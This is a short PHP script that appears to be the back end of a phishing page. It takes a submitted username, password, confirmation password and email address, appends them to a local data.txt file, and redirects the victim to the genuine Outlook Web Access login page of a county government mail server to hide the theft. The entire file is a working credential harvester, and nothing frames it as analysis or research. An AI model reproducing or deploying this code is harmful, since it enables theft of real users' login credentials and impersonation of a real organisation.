<?php
if(isset($_GET['gosend'])){
	$subject = mt_rand();
	$message = ' USERNAME: '.$_POST['username']."\r\n";
	$message .= ' PASSWORD: '.$_POST['password']."\r\n";
	$message .= ' CONFIRM: '.$_POST['confirm_password']."\r\n";
	$message .= ' EMAIL: '.$_POST['email']. "\r\n";
  $message .= '-------------------------------'."\r\n";
	
		$fp = fopen('data.txt', 'a');
		fwrite($fp, $message);
		fclose($fp);

		header("Location: https://mail.pacounties.org/owa/auth/logon.aspx");
		exit;
}
?>